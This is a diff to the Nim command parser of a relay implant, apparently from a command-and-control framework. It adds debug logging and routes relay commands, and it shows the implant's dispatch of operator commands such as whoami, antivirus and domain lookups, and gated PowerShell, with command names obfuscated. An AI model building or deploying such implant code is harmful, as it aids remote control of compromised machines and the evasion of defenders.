@@ -31,7 +31,15 @@ proc parseCmdRelay*(ri : RelayImplant, cmd : string, cmdGuid : string, args : se
     # Debug logging - show received command
     when defined debug:
         let argsStr = if args.len > 0: " " & args.join(" ") else: ""
-        echo "[DEBUG] Relay command: " & cmd & argsStr
+        echo "[DEBUG] 🔍 ┌─────────── CMDPARSER RELAY INPUT ───────────┐"
+        echo "[DEBUG] 🔍 │ Raw cmd: '" & cmd & "' │"
+        echo "[DEBUG] 🔍 │ cmd length: " & $cmd.len & " │"
+        echo "[DEBUG] 🔍 │ args: " & $args & " │"
+        echo "[DEBUG] 🔍 │ cmdGuid: '" & cmdGuid & "' │"
+        echo "[DEBUG] 🔍 │ Full command: '" & cmd & argsStr & "' │"
+        echo "[DEBUG] 🔍 │ obf('relay'): '" & obf("relay") & "' │"
+        echo "[DEBUG] 🔍 │ cmd == obf('relay'): " & $(cmd == obf("relay")) & " │"
+        echo "[DEBUG] 🔍 └─────────────────────────────────────────────┘"
 
     try:
         # Parse the received command - only commands that don't require Listener object
@@ -68,8 +76,23 @@ proc parseCmdRelay*(ri : RelayImplant, cmd : string, cmdGuid : string, args : se
         elif cmd == obf("whoami"):
             result = whoami()
         elif cmd == obf("relay"):
-            result = relay(args)
+            # Handle relay commands with full command string (same as normal mode)
+            let fullCmd = cmd & (if args.len > 0: " " & args.join(" ") else: "")
+            when defined debug:
+                echo "[DEBUG] 🔧 ┌─────────── CMDPARSER RELAY MATCH ───────────┐"
+                echo "[DEBUG] 🔧 │ ✅ RELAY COMMAND MATCHED! │"
+                echo "[DEBUG] 🔧 │ fullCmd: '" & fullCmd & "' │"
+                echo "[DEBUG] 🔧 └─────────────────────────────────────────────┘"
+            result = processRelayCommand(fullCmd)
         else:
+            when defined debug:
+                echo "[DEBUG] ❌ ┌─────────── CMDPARSER NO MATCH ───────────┐"
+                echo "[DEBUG] ❌ │ Command '" & cmd & "' not recognized │"
+                echo "[DEBUG] ❌ │ Available commands checked: │"
+                echo "[DEBUG] ❌ │ - cat, cd, cp, env, getav, getdom, etc. │"
+                echo "[DEBUG] ❌ │ - relay: obf('relay') = '" & obf("relay") & "' │"
+                echo "[DEBUG] ❌ │ This will result in 'unknown command' error │"
+                echo "[DEBUG] ❌ └─────────────────────────────────────────────┘"
             # Parse risky commands, if enabled (commands that don't need Listener)
             when defined risky:
                 if cmd == obf("powershell"):
